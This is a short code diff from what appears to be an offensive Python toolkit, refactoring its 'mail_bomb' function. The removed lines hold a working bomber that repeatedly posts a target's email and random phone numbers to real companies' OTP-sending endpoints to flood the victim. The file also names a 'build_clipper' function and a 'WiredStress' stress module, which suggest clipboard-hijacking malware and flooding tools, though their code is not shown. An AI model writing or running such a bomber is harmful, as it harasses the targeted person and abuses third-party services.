@@ -1,24 +1,10 @@
 import requests, time, random, json, re, os, subprocess, concurrent.futures, socket, threading, sys
 from core.display import get_inpt, Colors, Colorate, Theme
 from modules.boot import WiredStress
+from modules.mail_bomb import run_bomber
 
 def mail_bomb(t, c):
-    cl = Theme.get_colors()
-    rp = lambda: f"{random.randint(7000000000, 9999999999)}"
-    as_ = [
-        {"u":"https://apis.bisleri.com/send-otp","m":"POST","d":lambda t,p: json.dumps({"email":t,"mobile":p})},
-        {"u":"https://apinew.moglix.com/nodeApi/v1/login/sendOTP","m":"POST","d":lambda t,p: json.dumps({"email":t,"phone":p,"type":"p","source":"signup"})}
-    ]
-    s, f = 0, 0
-    for _ in range(c):
-        a, p = random.choice(as_), rp()
-        try:
-            r = requests.post(a["u"], data=a["d"](t, p), timeout=6)
-            if r.status_code in [200, 201]: s += 1; print(Colorate.Horizontal(cl["head"], f"  [+] Sent via {a['u'].split('/')[2]}"))
-            else: f += 1
-        except: f += 1
-        time.sleep(0.1)
-    print(Colorate.Horizontal(cl["head"], f"\n  Done. OK: {s} | FAIL: {f}"))
+    run_bomber(t, c)
 
 def build_clipper():
     cl = Theme.get_colors()
